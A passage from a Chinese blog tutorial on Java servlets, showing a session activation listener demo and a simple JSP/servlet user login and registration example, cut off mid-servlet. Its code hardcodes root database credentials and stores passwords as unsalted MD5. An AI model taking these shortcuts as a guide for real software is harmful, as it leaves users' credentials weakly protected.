<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionActivationListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Y</span> <span class="keyword">implements</span> <span class="title">HttpSessionActivationListener</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="keyword">public</span> String b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Y</span><span class="params">(String start, String end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = start;</span><br><span class="line">        <span class="keyword">this</span>.b = end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Y</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionDidActivate</span><span class="params">(HttpSessionEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionActivationListener.<span class="keyword">super</span>.sessionDidActivate(se);</span><br><span class="line">        System.out.println(<span class="string">&quot;a -&gt; &quot;</span> + <span class="keyword">this</span>.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionWillPassivate</span><span class="params">(HttpSessionEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionActivationListener.<span class="keyword">super</span>.sessionWillPassivate(se);</span><br><span class="line">        System.out.println(<span class="string">&quot;b -&gt; &quot;</span> + <span class="keyword">this</span>.b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将其打包成 <code>jar</code> 放到对应目录后，在 <code>web.xml</code> 写入以下内容👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>custom.Y<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后是 <code>y.jsp</code> 文件内容👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;custom.Y&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Y&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Y y = <span class="keyword">new</span> Y(<span class="string">&quot;活化&quot;</span>,<span class="string">&quot;钝化&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;x&quot;</span>,y);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>先访问 <code>y.jsp</code> ，再关闭服务器得到以下结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241510017.png" alt="image-20220224151033908"></p>
<p>由于这里用的是 <code>IntelliJ IDEA</code> 配合 <code>tomcat</code> 每次关闭服务器都会将临时配置文件清空，所以应该是在启动服务器时没能显示 <code>a -&gt; 活化</code> 的原因。</p>
<h3 id="其他">- 其他 -</h3>
<p>随便写写几个例子加深下印象。</p>
<h4 id="用户管理实例">- 用户管理实例 -</h4>
<h5 id="要求">- 要求 -</h5>
<p>简单实现 <code>用户注册</code>， <code>用户登录</code> ，<code>用户登出</code> 。</p>
<h5 id="实现">- 实现 -</h5>
<p>先随便建个表👇</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> user.userInfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">255</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>登录页面 <code>login.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;core&quot;</span> target=<span class="string">&quot;_self&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input hidden=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;login&quot;</span>/&gt;</span><br><span class="line">    &lt;p&gt; 用户名 &lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p&gt;密 码&lt;/p&gt;&lt;/p&gt;&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;register.jsp&quot;</span>&gt;注册&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>注册页面 <code>register.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Register&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;core&quot;</span> target=<span class="string">&quot;_self&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input hidden=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;register&quot;</span>/&gt;</span><br><span class="line">    &lt;p&gt;用户名&lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p&gt;密 码&lt;/p&gt;&lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p&gt;重复密码&lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;repassword&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;注册&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;login.jsp&quot;</span>&gt;登录&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>登出页面 <code>logout.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Logout&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;core&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;logout&quot;</span> /&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>个人主页 <code>home.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">boolean</span> isLogin = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(session.getAttribute(<span class="string">&quot;login&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">        isLogin = (<span class="keyword">boolean</span>) session.getAttribute(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!isLogin)</span><br><span class="line">    &#123;</span><br><span class="line">        out.write(<span class="string">&quot;还未登录！页面将在 3 秒后跳转至登录页面！&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;h1&gt;你好，&lt;%=session.getAttribute(<span class="string">&quot;user&quot;</span>)%&gt;&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;logout.jsp&quot;</span>&gt;登出&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>处理编码的 <code>filter</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.usermanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;textFilter&quot;, value = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">textFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理逻辑的 <code>servlet</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.usermanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;core&quot;, value = &quot;/core&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">coreServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">&quot;jdbc:mysql://localhost:3306/user?serverTimezone=UTC&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String USER = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PASS = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Connection conn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            <span class="keyword">this</span>.conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException | ClassNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt; &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String user = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String pass = req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span> || pass == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;用户名或密码为空！页面将在 3 秒后跳转回登录界面！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        MessageDigest md5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md5.update(pass.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        String passHash = Base64.getEncoder().encodeToString(md5.digest());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            PreparedStatement preparedStatement = <span class="keyword">this</span>.conn.prepareStatement(<span class="string">&quot;select * from userInfo where username = ? and password = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>,user);</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>,passHash);</span><br><span class="line"></span><br><span class="line">            ResultSet resultSet = preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(resultSet != <span class="keyword">null</span> &amp;&amp; resultSet.next())&#123;</span><br><span class="line"></span><br><span class="line">                HttpSession session = req.getSession(<span class="keyword">true</span>);</span><br><span class="line">                String sqlUser = resultSet.getString(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                session.setAttribute(<span class="string">&quot;user&quot;</span>,sqlUser);</span><br><span class="line">                session.setAttribute(<span class="string">&quot;login&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                success = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(success)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;登录成功！页面将在 3 秒后跳转至个人主页！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=home.jsp&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;登录失败！页面将在 3 秒后跳转至登录页面！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String user = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String pass = req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String repass = req.getParameter(<span class="string">&quot;repassword&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!pass.equals(repass))&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;两次密码不一致！页面将在 3 秒后跳转回注册界面！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span> || pass == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;用户名或密码为空！页面将在 3 秒后跳转回注册界面！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            MessageDigest md5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            